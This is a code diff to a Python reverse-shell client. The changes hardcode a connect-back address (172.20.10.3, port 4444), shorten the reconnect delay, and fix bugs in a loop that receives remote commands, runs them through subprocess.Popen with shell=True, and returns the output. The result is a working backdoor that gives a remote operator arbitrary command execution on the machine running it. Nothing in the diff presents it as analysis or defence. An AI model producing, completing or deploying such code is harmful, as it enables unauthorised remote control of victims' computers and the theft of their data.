@@ -3,16 +3,16 @@ import time
 import json
 import subprocess
 
-IP = None
-PORT = None
+IP = "172.20.10.3"
+PORT = 4444
 def connect(s):
     while(True):
-        time.sleep(25)
+        time.sleep(10)
         try:
             s.connect((str(IP), int(PORT)))
             shell(s)
-            s.close()
-        except:
+        except Exception as e:
+            print(e)
             connect(s)
 
 def reliable_send(command, target):
@@ -29,9 +29,9 @@ def reliable_receive(target):
             continue
 def shell(target):
     while(True):
-        command = reliable_receive()
+        command = reliable_receive(target)
         if command == "exit":
-            break
+            quit()
         else:
             execution = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
             result = execution.stdout.read() + execution.stderr.read()
